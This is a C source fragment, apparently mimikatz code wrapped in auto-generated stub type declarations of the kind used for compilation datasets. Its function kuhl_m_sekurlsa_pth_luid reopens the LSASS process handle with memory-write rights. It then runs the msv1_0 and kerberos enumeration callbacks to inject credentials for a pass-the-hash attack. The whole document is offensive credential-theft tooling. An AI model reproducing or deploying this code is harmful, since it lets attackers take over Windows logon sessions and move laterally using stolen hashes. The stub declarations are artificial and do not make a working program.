#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_15__   TYPE_8__ ;
typedef  struct TYPE_14__   TYPE_5__ ;
typedef  struct TYPE_13__   TYPE_4__ ;
typedef  struct TYPE_12__   TYPE_3__ ;
typedef  struct TYPE_11__   TYPE_2__ ;
typedef  struct TYPE_10__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  VOID ;
typedef  int /*<<< orphan*/  ULONG ;
struct TYPE_15__ {TYPE_2__* hLsassMem; } ;
struct TYPE_14__ {int GrantedAccess; } ;
struct TYPE_13__ {TYPE_3__* LogonId; } ;
struct TYPE_12__ {int /*<<< orphan*/  LowPart; int /*<<< orphan*/  HighPart; } ;
struct TYPE_11__ {scalar_t__ type; TYPE_1__* pHandleProcess; } ;
struct TYPE_10__ {int /*<<< orphan*/  hProcess; } ;
typedef  TYPE_4__* PSEKURLSA_PTH_DATA ;
typedef  TYPE_5__ OBJECT_BASIC_INFORMATION ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  int /*<<< orphan*/  HANDLE ;
typedef  int BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  CloseHandle (int /*<<< orphan*/ ) ; 
 int FALSE ; 
 int /*<<< orphan*/  GetProcessId (int /*<<< orphan*/ ) ; 
 scalar_t__ KULL_M_MEMORY_TYPE_PROCESS ; 
 scalar_t__ NT_SUCCESS (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  NtQueryObject (int /*<<< orphan*/ ,int /*<<< orphan*/ ,TYPE_5__*,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  ObjectBasicInformation ; 
 int /*<<< orphan*/  OpenProcess (int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  PRINT_ERROR (char*,...) ; 
 int /*<<< orphan*/  PRINT_ERROR_AUTO (char*) ; 
 int PROCESS_VM_OPERATION ; 
 int PROCESS_VM_WRITE ; 
 int TRUE ; 
 TYPE_8__ cLsass ; 
 int /*<<< orphan*/  kprintf (char*,...) ; 
 int /*<<< orphan*/  kuhl_m_sekurlsa_acquireLSA () ; 
 int /*<<< orphan*/  kuhl_m_sekurlsa_enum (int /*<<< orphan*/ ,TYPE_4__*) ; 
 int /*<<< orphan*/  kuhl_m_sekurlsa_enum_callback_kerberos_pth ; 
 int /*<<< orphan*/  kuhl_m_sekurlsa_enum_callback_msv_pth ; 

VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
{
	OBJECT_BASIC_INFORMATION bi;
	ULONG szNeeded;
	HANDLE hTemp;
	NTSTATUS status;
	BOOL isRWok = FALSE;

	if(NT_SUCCESS(kuhl_m_sekurlsa_acquireLSA()) && (cLsass.hLsassMem->type == KULL_M_MEMORY_TYPE_PROCESS))
	{
		kprintf(L"  |  LSA Process ");
		status = NtQueryObject(cLsass.hLsassMem->pHandleProcess->hProcess, ObjectBasicInformation, &bi, sizeof(OBJECT_BASIC_INFORMATION), &szNeeded);
		if(NT_SUCCESS(status))
		{
			if(isRWok = (bi.GrantedAccess & (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)))
				kprintf(L"was already R/W\n");
			else
			{
				if(hTemp = OpenProcess(bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, GetProcessId(cLsass.hLsassMem->pHandleProcess->hProcess)))
				{
					isRWok = TRUE;
					CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
					cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
					kprintf(L"is now R/W\n");
				}
				else PRINT_ERROR_AUTO(L"OpenProcess");

				//if(isRWok = DuplicateHandle(GetCurrentProcess(), cLsass.hLsassMem->pHandleProcess->hProcess, GetCurrentProcess(), &hTemp, bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, 0)) // FAIL :(
				//{
				//	CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
				//	cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
				//	kprintf(L"is now R/W\n");
				//}
				//else PRINT_ERROR_AUTO(L"DuplicateHandle");
			}
		}
		else PRINT_ERROR(L"NtQueryObject: %08x\n", status);

		if(isRWok)
		{
			kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", data->LogonId->HighPart, data->LogonId->LowPart, data->LogonId->HighPart, data->LogonId->LowPart);
			kprintf(L"  \\_ msv1_0   - ");
			kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, data);
			kprintf(L"\n");
			kprintf(L"  \\_ kerberos - ");
			kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, data);
			kprintf(L"\n");
		}
	}
	else PRINT_ERROR(L"memory handle is not KULL_M_MEMORY_TYPE_PROCESS\n"); 
}